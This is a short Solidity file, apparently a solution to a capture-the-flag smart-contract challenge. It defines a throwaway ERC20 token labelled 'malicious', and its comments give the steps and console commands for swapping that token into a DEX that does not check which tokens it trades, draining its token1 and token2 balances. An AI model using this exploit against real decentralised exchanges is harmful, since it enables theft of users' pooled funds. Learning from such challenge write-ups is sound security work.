
//create a malicious token

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract yeetToken is ERC20 {
    constructor(uint256 initialSupply) ERC20("yeetToken", "YEET") {
        _mint(msg.sender, initialSupply);
    }
}

// send 100 of the token to the contract address to ensure 1:1:1 ratio
// allow contract to transact 300 of yeet, done via approve method 
// use await contract.swap(yeet, t1, 100) to drain token1
// to check the balance use `await contract.balanceOf(t1, instance).then(v => v.toString())`
// I found that my ratios were off in the first instance so the check was helpful
// drain token2 via await contract.swap(evlToken, t2, 200)